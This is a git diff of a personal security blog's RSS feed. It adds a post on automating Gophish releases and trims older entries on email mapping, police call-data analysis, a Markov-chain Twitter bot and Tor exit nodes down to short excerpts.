@@ -6,8 +6,32 @@
     <description>Recent content on Jordan Wright</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 12 Oct 2016 18:57:33 -0500</lastBuildDate>
-    <atom:link href="https://jordan-wright.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 04 Feb 2018 11:00:59 -0600</lastBuildDate>
+    
+	<atom:link href="https://jordan-wright.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Automating Gophish Releases With Ansible and Docker</title>
+      <link>https://jordan-wright.com/blog/post/2018-01-15-automating-gophish-releases/</link>
+      <pubDate>Sun, 04 Feb 2018 11:00:59 -0600</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/post/2018-01-15-automating-gophish-releases/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/gophish_releases.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+&lt;br&gt;
+It&amp;rsquo;s been a while! While I haven&amp;rsquo;t posted as much here, I have been writing quite a bit &lt;a href=&#34;https://duo.com/blog/post_author/jwright&#34;&gt;over on Duo&amp;rsquo;s blog&lt;/a&gt; about the really cool research I&amp;rsquo;ve gotten to do this past year with the incredible Duo Labs team.&lt;/p&gt;
+
+&lt;p&gt;Any spare time I&amp;rsquo;ve had has been spent working on Gophish. This past year I&amp;rsquo;ve released a &lt;a href=&#34;https://getgophish.com&#34;&gt;new hand-crafted, artisinal website&lt;/a&gt;, responded to nearly 400 support requests, and made too many improvements to count!&lt;/p&gt;
+
+&lt;p&gt;Now, most people who use Gophish use a pre-built binary&lt;a href=&#34;#footnote-1&#34;&gt;*&lt;/a&gt;, which means that it&amp;rsquo;s important to make new releases as soon as possible after improvements are made. Otherwise, I&amp;rsquo;m left answering support requests with the advice of &amp;ldquo;build from source&amp;rdquo;, which is not ideal.&lt;/p&gt;
+
+&lt;p&gt;The previous release process was manual, making it a &lt;strong&gt;huge pain&lt;/strong&gt;. This led to inconsistency and large amounts of time spent packaging every release, which results in very infrequent releases.&lt;/p&gt;
+
+&lt;p&gt;This post documents the previous process as well as how I recently improved it using Ansible, Docker, DigitalOcean API&amp;rsquo;s, and more.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;</description>
+    </item>
     
     <item>
       <title>Mapping the Clinton Emails</title>
@@ -18,27 +42,7 @@
       <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/clinton-emails.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
-&lt;p&gt;Back in March, &lt;a href=&#34;https://wikileaks.org/clinton-emails/&#34;&gt;Wikileaks released&lt;/a&gt; over 30,000 emails &amp;ldquo;sent to and from Hillary Clinton&amp;rsquo;s private email server while she was Secretary of State&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;I decided to make a quick map showing how emails were sent through the server, mapping the senders and recipients. This post is a quick explanation of how I did it.&lt;/p&gt;
-
-&lt;p&gt;First, I needed the emails. I didn&amp;rsquo;t see an official bulk download from Wikileaks, and I didn&amp;rsquo;t need all the data anyway - just the sender and recipient. It turned out to be another job for Python, some good whiskey, and &lt;code&gt;BeautifulSoup&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;I iterated through each page of &lt;a href=&#34;https://wikileaks.org/clinton-emails/?q=&amp;amp;mfrom=&amp;amp;mto=&amp;amp;title=&amp;amp;notitle=&amp;amp;date_from=1995-03-02&amp;amp;date_to=2014-12-14&amp;amp;nofrom=&amp;amp;noto=&amp;amp;count=200&amp;amp;sort=0#searchresult&#34;&gt;search result data&lt;/a&gt; (searching for anything in the &amp;ldquo;All&amp;rdquo; date range) at 200 results per page. Then, I used &lt;code&gt;BeautifulSoup&lt;/code&gt; to parse out each record.&lt;/p&gt;
-
-&lt;p&gt;After I had the data, I put it into a weighted directed graph using &lt;code&gt;networkx&lt;/code&gt;. This also let me dump the results into &lt;code&gt;gexf&lt;/code&gt; format - the native format for use with Gephi.&lt;/p&gt;
-
-&lt;p&gt;Finally, I used Gephi to make the data pretty. I just applied a ForceAtlas layout, adjusted the size of the nodes by degree, and ran the automatic community detection to color each node.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s the final result (click for higher res)!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/clinton-emails/emails_large.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/clinton-emails/emails.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
-&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;You can find all the code and raw data files &lt;a href=&#34;https://github.com/jordan-wright/clinton-emails&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;Back in March, &lt;a href=&#34;https://wikileaks.org/clinton-emails/&#34;&gt;Wikileaks released&lt;/a&gt; over 30,000 emails &amp;ldquo;sent to and from Hillary Clinton&amp;rsquo;s private email server while she was Secretary of State&amp;rdquo;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -47,9 +51,7 @@
       <pubDate>Wed, 22 Jun 2016 06:30:00 -0500</pubDate>
       
       <guid>https://jordan-wright.com/blog/post/2016-05-06-exploring-sapd-call-data-with-elk/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/sapd.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/sapd.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;p&gt;San Antonio is a great city. &lt;a href=&#34;http://www.yelp.com/search?cflt=mexican&amp;amp;find_loc=San+Antonio%2C+TX%2C+USA&#34;&gt;According to Yelp&lt;/a&gt;, there are over 1200 places to get a taco - how could it &lt;em&gt;not&lt;/em&gt; be great?&lt;/p&gt;
@@ -58,146 +60,8 @@
 
 &lt;p&gt;Being an amateur API aficionado, I was excited to find the &lt;a href=&#34;http://www.sanantonio.gov/SAPD/SAPDOpenDataInitiative.aspx#182281929-open-data&#34;&gt;SAPD Open Data Initiative&lt;/a&gt; that contains a wealth of information on the activities the SAPD perform. Specifically, I wanted to see what kinds of analytics I could gather from exploring the historic SAPD call data.&lt;/p&gt;
 
-&lt;p&gt;In this post, I&amp;rsquo;ll explain how I was able to gather and analyze &lt;strong&gt;4.3 million call data records&lt;/strong&gt;, or how I basically became the extremely boring part of Batman.&lt;/p&gt;
-
-&lt;h3 id=&#34;getting-the-call-data&#34;&gt;Getting the Call Data&lt;/h3&gt;
-
-&lt;h4 id=&#34;a-little-about-the-format&#34;&gt;A Little About the Format&lt;/h4&gt;
-
-&lt;p&gt;The first thing we have to do is get the call data. As part of the Open Data Initiative, SAPD &lt;a href=&#34;http://www.sanantonio.gov/SAPD/Calls.aspx&#34;&gt;publishes historical calls&lt;/a&gt; on their website. This interface lets you search through calls that were responded to by an SAPD officer dating back to January 1, 2011.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/call_details.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;Each call record has the following details:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Incident Number&lt;/strong&gt; - A unique identifier for the call in SAPD-YYYY-xxxxxxx format&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt; - The category of the call (e.g. &amp;ldquo;Crimes Against Person Calls&amp;rdquo;)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Problem Type&lt;/strong&gt; - The sub-type of the call that narrows down from the root category (e.g. &amp;ldquo;Robbery of Individual&amp;rdquo;)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Response Date&lt;/strong&gt; - The date/time a response was given to the call&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Address&lt;/strong&gt; - The address where the incident occurred&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;HOA&lt;/strong&gt; - The Homeowner&amp;rsquo;s Association where the incident occurred (if applicable)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;School District&lt;/strong&gt; - The school district where the incident occurred&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Council District&lt;/strong&gt; - The council district where the incident occurred&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This is a &lt;em&gt;ton&lt;/em&gt; of great data. However, searching through the data manually is a pain, and I didn&amp;rsquo;t see any obvious bulk export feature. Time to get out the whiskey and BeautifulSoup and get to scraping.&lt;/p&gt;
-
-&lt;h4 id=&#34;scraping-the-data&#34;&gt;Scraping the Data&lt;/h4&gt;
-
-&lt;p&gt;Scraping the site turned out to be a chore for multiple reasons, the first of which was due to the &lt;a href=&#34;https://www.ssllabs.com/ssltest/analyze.html?d=webapps2.sanantonio.gov&amp;amp;hideResults=on&#34;&gt;SSL configuration in use&lt;/a&gt;. I wound up having to use a custom TLS adapter just to get the &lt;code&gt;requests&lt;/code&gt; library to negotiate a TLS connection.&lt;/p&gt;
-
-&lt;p&gt;Then I had to address the restrictions on how I could search. I had to filter by a certain category and I could only get at most 10k results per query. To put things in perspective, that lets me &lt;em&gt;usually&lt;/em&gt; get a week of calls labelled as &amp;ldquo;Other&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;No one can say our officers aren&amp;rsquo;t busy.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;I ended up hacking together a scraper that ran like this:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;For every category
-
-&lt;ul&gt;
-&lt;li&gt;Try to get a week&amp;rsquo;s worth of calls&lt;/li&gt;
-&lt;li&gt;If # calls = 10000
-
-&lt;ul&gt;
-&lt;li&gt;Get that week a day at a time to make sure we don&amp;rsquo;t miss anything&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Store the results&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://gist.github.com/jordan-wright/92e209d89a4174e3ccb50ed4f909e58e&#34;&gt;Here&amp;rsquo;s&lt;/a&gt; the current code - be warned, it&amp;rsquo;s hacky. I was manually changing the categories to make sure things were going smoothly, so YMMV.&lt;/p&gt;
-
-&lt;p&gt;After finishing up the scraping, I was left with &lt;strong&gt;4.3 million records&lt;/strong&gt; to work with.&lt;/p&gt;
-
-&lt;h3 id=&#34;analyzing-the-data&#34;&gt;Analyzing the Data&lt;/h3&gt;
-
-&lt;p&gt;After grabbing all the data, I wrote a quick script to dump it into ELK. Loading up Kibana, we see our sweet, sweet data.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/calls_over_time.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;We can immediately see that calls are surprisingly consistent in terms of frequency. Digging into the data, we can find some other neat insights:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Theft and Crimes Against People&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;I started filtering the data looking for theft/burglary and crimes against people. Looking at the top 10 call types, the generic call description of &amp;ldquo;theft&amp;rdquo; was consistently the highest:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/person_and_theft.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;With this data, it was easy to track down the most dangerous zip code and address by filtering to just the &amp;ldquo;crimes against persons&amp;rdquo; category. With right around 40k calls, zipcode 78207 (mapped below) accounts for 7.1% of all crimes against people:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/zipcodes_person.png&#34;/&gt;&lt;/p&gt;
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/78207.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
-
-
-&lt;p&gt;We can do the same filtering to find the most dangerous school district - San Antonio ISD comes in the highest at 196k calls, which is around 36%:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/school_crimes.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;When Does Crime Happen?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;This was an interesting one, since I couldn&amp;rsquo;t find a good way to display this in Kibana. To Python, more whiskey, and Excel we go. I wrote a quick script to parse the &amp;ldquo;Crimes Against Persons&amp;rdquo; calls to find the distribution by minute. Obviously, this will depend on where you live, what time of the year it is, etc. but here is the graph:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/crimes_by_minute.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Traffic Related Calls&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;The calls labelled as &amp;ldquo;traffic related&amp;rdquo; deal with traffic stops, DWIs, etc. I did the same analysis as before to find out when most traffic related calls happen and got these results:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/traffic_calls_by_minute.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking at the top addresses for traffic stops and DWI&amp;rsquo;s, we see that downtown is the place where most incidents happen:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/traffic_locations.png&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Other Calls&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;The &amp;ldquo;other&amp;rdquo; category gives some interesting datapoints - most of these deal with various disturbances. For example, we can see that the number of &amp;ldquo;fireworks disturbance&amp;rdquo; calls always spikes around July 4th, New Year&amp;rsquo;s Eve, and my birthday &lt;sup&gt;not really&lt;/sup&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/fireworks.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Issues with Geocoding&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;It was my original intent to geocode the records so that I could plot them in a heatmap fashion. Unfortunately, I ran into a couple of challenges:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Finding a geocoder&lt;/strong&gt; - Even though there are only about 233k unique addresses found in the data, I still ran into issues finding a free service to geocode that many addresses. I started working with Mapzen (which is pretty awesome), when I discovered my other problem:&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Generic Addresses&lt;/strong&gt; - Many of the addresses in the dataset are &lt;em&gt;incredibly&lt;/em&gt; vague. For example, the address with the most number of &amp;ldquo;traffic related&amp;rdquo; calls? &amp;ldquo;IH 10 W&amp;rdquo;, followed by &amp;ldquo;NW Loop 410&amp;rdquo;. Go figure.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Both of these made it difficult to come up with meaningful heatmaps to show crime over the SA region. If anyone has any ideas, hit me up.&lt;/p&gt;
-
-&lt;h3 id=&#34;sweet-sweet-dashboards&#34;&gt;Sweet, Sweet Dashboards&lt;/h3&gt;
-
-&lt;p&gt;One of the best parts about the ELK stack is the ability to create dashboards like this one:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/dashboard.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;This dashboard gives a great overview of the call details, with the ability to drill down into the calls you care about.&lt;/p&gt;
-
-&lt;p&gt;I don&amp;rsquo;t think it&amp;rsquo;s any stretch to say that having this visibility into crime across the city &lt;strong&gt;basically makes me&lt;/strong&gt; &lt;sup&gt;the boring part of&lt;/sup&gt; &lt;strong&gt;Batman&lt;/strong&gt;. After all, have you ever seen Batman and me in the same room?&lt;/p&gt;
-
-&lt;p&gt;Didn&amp;rsquo;t think so.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/sapd/batman.png&#34; style=&#34;max-height:400px;&#34; alt=&#34;&#34;&gt;
-
-&lt;br&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;have-some-data&#34;&gt;Have Some Data&lt;/h3&gt;
-
-&lt;p&gt;Since the purpose of this open data initiative was to share information with the community, I want to do my part by making the dataset available as JSON so that people who are much better than me at analyzing large data sets can find new insights that will help make SA a safer place to live.&lt;/p&gt;
-
-&lt;p&gt;The dataset contains all records from January 1, 2011 to November 30, 2015, which was when I pulled the data.&lt;/p&gt;
-
-&lt;p&gt;You can download the full dataset &lt;a href=&#34;https://drive.google.com/open?id=0B9Ile8onstUBbWgxakprZk9JYjA&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s help our officers make this city safer.&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;In this post, I&amp;rsquo;ll explain how I was able to gather and analyze &lt;strong&gt;4.3 million call data records&lt;/strong&gt;, or how I basically became the extremely boring part of Batman.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -206,9 +70,7 @@
       <pubDate>Sun, 10 Apr 2016 14:40:18 -0500</pubDate>
       
       <guid>https://jordan-wright.com/blog/post/2016-04-08-i-automated-infosec-thought-leadership/</guid>
-      <description>
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/thought-leader.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/thought-leader.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 &lt;br/&gt;&lt;/p&gt;
 
@@ -224,113 +86,8 @@
 
 &lt;p&gt;Unfortunately, both of these take way too much time for me. In fact, I&amp;rsquo;d argue that they take too long for our industry. So this weekend, I set out to &lt;strong&gt;automate thought leadership&lt;/strong&gt;, so that we can spend more time doing things that matter - things like coming up with marketing for the next CVE or finding obscure reflective XSS bugs that affect &lt;em&gt;literally no one&lt;/em&gt;.&lt;/p&gt;
 
-&lt;p&gt;This resulted in &lt;a href=&#34;https://twitter.com/thought__leader&#34;&gt;@thought__leader&lt;/a&gt;. And it&amp;rsquo;s hilarious.&lt;/p&gt;
-
-&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;RT mistydemeo: Oh thank goodness: GitHub orgs can now use drones armed with Zero days, new backdoors &lt;a href=&#34;https://t.co/pgVE7DFbUX&#34;&gt;https://t.co/pgVE7DFbUX&lt;/a&gt;&lt;/p&gt;&amp;mdash; InfoSecThoughtLeader (@thought__leader) &lt;a href=&#34;https://twitter.com/thought__leader/status/718971777385426944&#34;&gt;April 10, 2016&lt;/a&gt;&lt;/blockquote&gt;
-&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-
-&lt;h4 id=&#34;becoming-a-thought-leader&#34;&gt;Becoming a Thought Leader&lt;/h4&gt;
-
-&lt;p&gt;I created @thought__leader to be simple. Basically, it works by taking in a whole bunch of tweets from other thought leaders and spitting out new tweets using parts of what it gathered.&lt;/p&gt;
-
-&lt;h5 id=&#34;finding-thought-leaders&#34;&gt;Finding Thought Leaders&lt;/h5&gt;
-
-&lt;p&gt;First, I had to find thought leaders. My criteria was simple: the candidate had to have over 10k Twitter followers and they had to have a bunch of tweets. After all, I&amp;rsquo;m looking for &lt;a href=&#34;http://www.quickmeme.com/img/1d/1d6acc029adc6b99fca09b14def2ee281e0431f57b981b274b0c293a1af55a15.jpg&#34;&gt;thought &lt;strong&gt;leaders&lt;/strong&gt;&lt;/a&gt;, not thought &lt;strong&gt;thinkers&lt;/strong&gt;. This included infosec researchers, journalists, and more.&lt;/p&gt;
-
-&lt;p&gt;I also Googled &amp;ldquo;infosec thought leaders&amp;rdquo; and added people listed in the blog posts. They checked out somehow, I guess.&lt;/p&gt;
-
-&lt;p&gt;Then I added &lt;a href=&#34;https://twitter.com/threatbutt&#34;&gt;@threatbutt&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;This actually narrowed down the list of people quite a bit. All in all, I came up with &lt;a href=&#34;https://gist.github.com/jordan-wright/33265dc9ddcaaf1cebb79db09a6c8f8c&#34;&gt;these 99 accounts&lt;/a&gt; in no particular order. I&amp;rsquo;m sure I missed someone obvious.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;On a serious note, while we&amp;rsquo;re poking fun at the concept of thought leadership I should note that these folks are actually fantastic contributors to the field.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h5 id=&#34;gathering-thoughts&#34;&gt;Gathering Thoughts&lt;/h5&gt;
-
-&lt;p&gt;The next step was to download a whole bunch of premium &lt;em&gt;thought leadership&lt;/em&gt; using the &lt;code&gt;python-twitter&lt;/code&gt; library.&lt;/p&gt;
-
-&lt;p&gt;First, we connect to the Twitter API:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;import twitter
-api = twitter.Api(consumer_key=&#39;....&#39;,
-          consumer_secret=&#39;....&#39;,
-          access_token_key=&#39;....&#39;,
-          access_token_secret=&#39;....&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then, for every user, we can query the &lt;code&gt;statuses/user_timeline&lt;/code&gt; to grab their most recent tweets. Since rate limits allow 180 requests per 15 minutes, I kept track of where I was and ran the script a few times. I also chose to get rid of retweets and replies to help keep original content where possible.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;tweet_corpus = &amp;quot;&amp;quot;
-with open(&amp;quot;thought_leaders.txt&amp;quot;, &amp;quot;r&amp;quot;) as users:
-	for user in users.readlines():
-		user = user.strip()
-		since_id = &amp;quot;&amp;quot;
-		for user in users.readlines():
-			user = user.strip()
-			timeline = api.GetUserTimeline(screen_name=user, count=200, exclude_replies=True, max_id=tweets[user].get(&amp;quot;max_id&amp;quot;))
-			if len(timeline) &amp;lt;= 1: continue
-			tweet_corpus += &#39;\n&#39;.join([t.text for t in timeline if not t.text[:2] == &amp;quot;RT&amp;quot;]) + &amp;quot;\n&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Running this a few times resulted in just over 52k tweets. The leadership sitting in memory at this point is &lt;strong&gt;palpable&lt;/strong&gt;. Now let&amp;rsquo;s become a thought leader.&lt;/p&gt;
-
-&lt;h5 id=&#34;generating-thoughts&#34;&gt;Generating Thoughts&lt;/h5&gt;
-
-&lt;p&gt;To become a beacon of infosec futurism we need to be able to create new content from the tweets we grabbed. Taking the cue from other Twitter bots like &lt;a href=&#34;https://twitter.com/horse_ebooks?lang=en&#34;&gt;@horse_ebooks&lt;/a&gt; or the awesome &lt;a href=&#34;https://www.reddit.com/r/SubredditSimulator/&#34;&gt;Subreddit Simulator&lt;/a&gt; project, we&amp;rsquo;ll use &lt;strong&gt;Markov Chains&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;If you&amp;rsquo;re new to &lt;a href=&#34;https://en.wikipedia.org/wiki/Markov_chain&#34;&gt;Markov Chains&lt;/a&gt;, this explanation from the Subreddit Simulator description will work good enough:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;The text for [tweets] are generated using &amp;ldquo;markov chains&amp;rdquo;, a random process that&amp;rsquo;s &amp;ldquo;trained&amp;rdquo; from looking at real data. If you&amp;rsquo;ve ever used a keyboard on your phone that tries to predict which word you&amp;rsquo;ll type next, those are often built using something similar.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Fortunately for us, there&amp;rsquo;s a Python library called &lt;a href=&#34;https://github.com/jsvine/markovify&#34;&gt;markovify&lt;/a&gt; that makes building Markov Chains super easy.&lt;/p&gt;
-
-&lt;p&gt;To use the library, we just need a corpus of data to work with. In our case, it&amp;rsquo;s the &lt;code&gt;tweet_corpus&lt;/code&gt; we built up earlier. From the markovify readme, if we are using newline split data, we can send our corpus to an instance of the &lt;code&gt;markovify.NewLineText&lt;/code&gt; class to let it build up our Markov Chains.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;m = NewlineText(tweet_corpus)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;From here, we can generate new tweets by making calls like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;m.make_short_sentence(140)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Here are some samples:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Hackers hijacking water treatment plant controls shows how to resist and even with no security #6wordcyber
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Dell apologizes for HTTPS certificate for Google Maps tampering http://t.co/WyNrI7Snk3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Clearly this ex-defense minister is worried @kevinmitnick could whistle into a website for that gig.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Management will spend $12k on IM but wont pay for a Diffie-Hellman 1024-bit pair in 154 minutes http://t.co/UZerPfZbS3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Man-on-the-side content injection attacks in wake of Ashley Madison passwords http://t.co/zw4fqvMAbk
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Just had my frist experience with @SixtUSA and it wants its network management problems back.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Working on Tool to Test Network Security. And guess what? It is an even bigger God-complex https://t.co/vPcPyorOQp
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Let&#39;s do the talk again, for sure, especially as a geek, this makes me miss TrueCrypt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;Microsoft and fixes for Adobe Flash Player or Windows, it&#39;s time for Valentine&#39;s Day - https://t.co/L6tkJEmjld
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;em&gt;Awesome.&lt;/em&gt; All that&amp;rsquo;s left is to saturate the infosec Twittersphere with glorious thought leadership. Right now, I have the bot tweeting every 7 minutes. I&amp;rsquo;m also shamelessly re-grabbing the latest tweets every hour and retraining the model. I&amp;rsquo;ll open source the code eventually.&lt;/p&gt;
-
-&lt;p&gt;Consider thought leadership solved. Now we can get back to naming those CVE&amp;rsquo;s.&lt;/p&gt;
-</description>
+&lt;p&gt;This resulted in &lt;a href=&#34;https://twitter.com/thought__leader&#34;&gt;@thought__leader&lt;/a&gt;. And it&amp;rsquo;s hilarious.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -339,88 +96,15 @@ with open(&amp;quot;thought_leaders.txt&amp;quot;, &amp;quot;r&amp;quot;) as use
       <pubDate>Tue, 05 Apr 2016 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2016/04/05/what-happens-when-tor-exit-nodes-break-bad/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/heisenberg.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/heisenberg.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;When &lt;a href=&#34;https://jordan-wright.com/blog/blog/categories/tor/&#34;&gt;looking at how Tor works&lt;/a&gt;, we&amp;rsquo;ve looked at the various types of nodes that make up the Tor network. However, you&amp;rsquo;ll notice that we haven&amp;rsquo;t dealt too much with &lt;em&gt;exit nodes&lt;/em&gt;. Exit nodes are the final link in a Tor &amp;ldquo;circuit&amp;rdquo;, or path from the client to the server. Since exit nodes send data to the final destination, they can see the data as if it had just left the device.&lt;/p&gt;
 
-&lt;p&gt;This visibility puts quite a bit of trust in exit nodes and, for the most part, they tend to act responsibly. However, this isn&amp;rsquo;t always the case. This post will take a look at what happens when a Tor &lt;a href=&#34;https://i.imgur.com/L8L7k1Z.jpg&#34;&gt;exit node operator&lt;/a&gt; decides to &amp;ldquo;break bad&amp;rdquo; and wreak havoc on Tor users&lt;a href=&#34;#end-1&#34;&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;a-case-of-the-sniffles&#34;&gt;A Case of the Sniffles&lt;/h3&gt;
-
-&lt;p&gt;Tor exit nodes are the definition of a man-in-the-middle (MitM). This means that &lt;strong&gt;any&lt;/strong&gt; unencrypted protocols (e.g. FTP, HTTP, SMTP, etc.) can be seen by the exit node operator. This includes things like usernames, passwords, session cookies, or even file uploads/downloads.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;To be clear: Tor exit nodes can see traffic as if it were just leaving your device.&lt;/strong&gt;&lt;/p&gt;
